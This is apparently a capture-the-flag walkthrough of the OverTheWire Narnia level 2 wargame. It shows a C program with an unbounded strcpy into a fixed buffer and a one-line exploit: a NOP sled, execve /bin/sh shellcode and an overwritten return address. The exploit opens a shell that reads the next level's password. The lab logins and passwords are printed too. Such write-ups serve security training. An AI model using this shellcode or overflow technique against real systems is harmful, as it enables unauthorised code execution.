# narnia 2

    # ssh narnia2@narnia.labs.overthewire.org
    password: nairiepecu

    # cat /games/narnia/narnia2.c

    #include <stdio.h>
    #include <string.h>
    #include <stdlib.h>

    int main(int argc, char * argv[]){
        char buf[128];

        if(argc == 1){
            printf("Usage: %s argument\n", argv[0]);
            exit(1);
        }
        strcpy(buf,argv[1]);
        printf("%s", buf);

        return 0;
    }

    # /games/narnia/narnia2 `python -c 'print "\x90"*108+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"+"\x90"*4+"\xd0\xd5\xff\xff"'`

    # cat /etc/narnia_pass/narnia3
    vaequeezee

